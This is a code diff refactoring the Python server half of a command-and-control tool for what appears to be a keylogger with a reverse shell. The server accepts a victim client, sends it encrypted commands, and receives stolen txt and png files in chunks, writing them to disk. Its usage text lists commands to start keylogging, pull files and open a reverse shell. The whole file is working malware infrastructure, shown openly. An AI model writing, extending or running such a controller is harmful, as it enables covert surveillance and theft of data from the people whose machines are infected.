@@ -1,4 +1,5 @@
 # -*- coding: utf-8 -*-
+import logging
 import os
 import utils
 import socket
@@ -12,42 +13,94 @@ class CommandAndControl:
         self.file_path = "files"
         
         self.connect()
-        
+
+#--------------- SERVER METHODS ---------------#
     def connect(self):
         self.sock.bind((self.host, self.port))
         self.sock.listen(5)
         self.conn, addr = self.sock.accept()
-        print('Got connection from', addr)
+        logging.info(f"Got connection from {addr}")
         
     def close_connection(self):
         self.conn.close()
         
-    def send_message_to_client(self, data: str):
+    def send_command_to_client(self, data: str):
         data = data.encode(utils.ENCODING)
         encrypted_data = utils.encrypt(data)
         self.conn.sendall(encrypted_data)
         
-    def receive_message_from_client(self):
-        recv = self.conn.recv(utils.BUFFSIZE)
-        plainbytes = utils.decrypt(recv)
-        return plainbytes
+    def receive_from_client(self):
+        try:
+            recv = self.conn.recv(utils.BUFFSIZE)
+            plainbytes = utils.decrypt(recv)
+            return plainbytes
+        except (socket.error, AttributeError) as err:
+            logging.debug(err)
+    
+    def receive_file(self, header):
+        number_of_chunks = header["number_of_chunks"]
+        filename = header["filename"]
+        number_of_files_left = header["number_of_files_left"]
         
-    def print_usage():
-        print("Usage:")
-        print("help:        Print this usage message")
-        print("activate:    Activate the logging")
-        print("deactivate:  Deactivate the logging")
-        print("send:        Send txt and png files to the server")
-        print("shell:       Activate reverse-shell. Enter \"exit\" to deactivate")
-        print("exit:        Terminate server, client will wait for reconnection")
-        print("stop:        Terminate client and server")
+        while number_of_files_left > 0:          
+            data = b""
+            logging.info(f"Receiving File: {filename} Number of Chunks: {number_of_chunks}")
 
+            for _ in range(number_of_chunks):
+                recv = self.receive_from_client()
+                if recv:
+                    data += recv
+
+            self.write_file(data=data, filename=filename)
+            number_of_files_left -= 1
+            logging.info(f"File received, {number_of_files_left} files left")
+            
+            if number_of_files_left > 0:
+                recv = self.receive_from_client()
+                if recv:
+                    header = split_header(recv)
+                    number_of_chunks = header["number_of_chunks"]
+                    filename = header["filename"]
+                    number_of_files_left = header["number_of_files_left"]
+        
+    def receive_message(self, header):
+        msg = b""
+        for i in range(header["number_of_chunks"]):
+            recv = command_and_control.receive_from_client()
+            if recv:
+                msg += recv
+        return msg.decode(utils.ENCODING)
+    
+#--------------- CLI METHODS ---------------#
+    def print_usage():
+        logging.info("Usage:")
+        logging.info("help:        Print this usage message")
+        logging.info("activate:    Activate the logging")
+        logging.info("deactivate:  Deactivate the logging")
+        logging.info("send:        Send txt and png files to the server")
+        logging.info("shell:       Activate reverse-shell. Enter \"exit\" to deactivate")
+        logging.info("exit:        Terminate server, client will wait for reconnection")
+        logging.info("stop:        Terminate client and server")
+
+#--------------- FILE METHODS ---------------#
     def write_file(self, data:bytes, filename:str):
         if not os.path.exists(self.file_path):
             os.makedirs(self.file_path)
         with open(os.path.join(self.file_path, filename), "wb") as file:
             file.write(data)
 
+#--------------- FUNCTIONS ---------------#
+def split_header(header: bytes) -> dict:
+    l = header.decode(utils.ENCODING).split("__")
+
+    number_of_chunks = int(l[0]) if l[0] else None
+    filename = l[1] if l[1] else None
+    number_of_files_left = int(l[2]) if l[2] else None
+
+    header = {"number_of_chunks":number_of_chunks, "filename":filename, "number_of_files_left":number_of_files_left}
+    return header
+
+#--------------- MAIN ---------------#    
 if __name__ == "__main__":
     reverse_shell_active = False
     command_and_control = CommandAndControl()
@@ -62,58 +115,35 @@ if __name__ == "__main__":
                 command_and_control.print_usage()
                 
             elif inpt == "exit" and not reverse_shell_active:
-                print("stopping server")
+                logging.info("stopping server")
                 break
             else:
-                command_and_control.send_message_to_client(inpt)
+                command_and_control.send_command_to_client(inpt)
 
-                recv = command_and_control.receive_message_from_client()
-                if recv:
-                    header = recv.decode(utils.ENCODING).split("__")
+                header_binary = command_and_control.receive_from_client()
+                if header_binary:
+                    header = split_header(header_binary)
 
-                    if len(header) == 3: # If len is 3, the header contains a filename. In this case its a file and will be handled as one
-                        filename, chunk_size, number_of_files_left = header[0], int(header[1]), int(header[2])
-                        while number_of_files_left > 0:
-                            print("Receiving File:", filename, "chunk_size:", chunk_size)
-                            data = b""
-                            for i in range(chunk_size):
-                                recv = command_and_control.receive_message_from_client()
-                                if recv:
-                                    data += recv
-                            command_and_control.write_file(data=data, filename=filename)
-                            number_of_files_left -= 1
-                            print("File received,", number_of_files_left, "files left")
-                            
-                            if number_of_files_left > 0:
-                                recv = command_and_control.receive_message_from_client()
-                                if recv:
-                                    header = recv.decode(utils.ENCODING).split("__")
-                                    filename, chunk_size, number_of_files_left = header[0], int(header[1]), int(header[2])
-
-                    elif len(header) == 1: # If len is 1, the header just contains chunk_size and thus will not be converted to a file.
-                        chunk_size = int(header[0])
-                        msg = b""
-                        for i in range(chunk_size):
-                            recv = command_and_control.receive_message_from_client()
-                            if recv:
-                                msg += recv
-                        msg = msg.decode(utils.ENCODING)
+                    if header["filename"]:
+                        command_and_control.receive_file(header)
+                    else:
+                        msg = command_and_control.receive_message(header)
                             
                         if msg == "keylogger stopped":
-                            print("keylogger stopped")
+                            logging.info("keylogger stopped")
                             break
                         elif msg == "logging activated":
-                            print("logging activated")
+                            logging.info("logging activated")
                         elif msg == "logging deactivated":
-                            print("logging deactivated")
+                            logging.info("logging deactivated")
                         elif msg == "reverse shell activated":
                             reverse_shell_active = True
                         elif msg == "reverse shell deactivated":
                             reverse_shell_active = False
                         elif msg == "unknown command":
-                            print(f"unknown command: {inpt}")
+                            logging.info(f"unknown command: {inpt}")
                         else:
-                            print(f"unknown answer from client: {msg}")
+                            logging.info(f"unknown answer from client: {msg}")
 
     command_and_control.close_connection()
-    print("good bye")
+    logging.info("good bye")
